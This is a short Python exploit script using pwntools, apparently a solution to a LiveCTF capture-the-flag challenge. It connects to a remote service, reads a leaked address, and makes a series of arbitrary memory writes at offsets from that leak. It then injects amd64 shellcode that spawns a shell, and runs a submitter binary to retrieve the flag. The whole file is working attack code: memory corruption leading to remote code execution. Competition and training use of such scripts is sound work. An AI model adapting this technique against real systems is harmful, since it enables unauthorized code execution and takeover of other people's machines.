from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
sh = remote(HOST, int(PORT))



leak = u64(sh.recv(8))
print(hex(leak))
target = leak + 0x45b4

sh.send(p64(target))
sh.send(b'\x00'*8)

# sh.send(p64(leak + 0x2500))
# sh.send(p64(0xdeadbeefdeadbeef))

sh.send(p64(leak+0x00004330))
sh.send(p64(leak+0x1370))

sh.send(p64(leak+0x00004338))
sh.send(p64(leak+0x2000))

sh.send(p64(0))
sh.send(p32(0))

# ignore leak
u64(sh.recv(8))
code = asm(shellcraft.amd64.linux.sh())
code = code.ljust(len(code) + (8 - len(code) % 8), b'\x90')
for i in range(0, len(code), 8):
  sh.send(p64(leak+0x00002158+i))
  sh.send(code[i:i+8])
sh.send(p32(0))

sleep(1)
sh.sendline(b'./submitter')
flag = sh.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
# print(sh.recvall())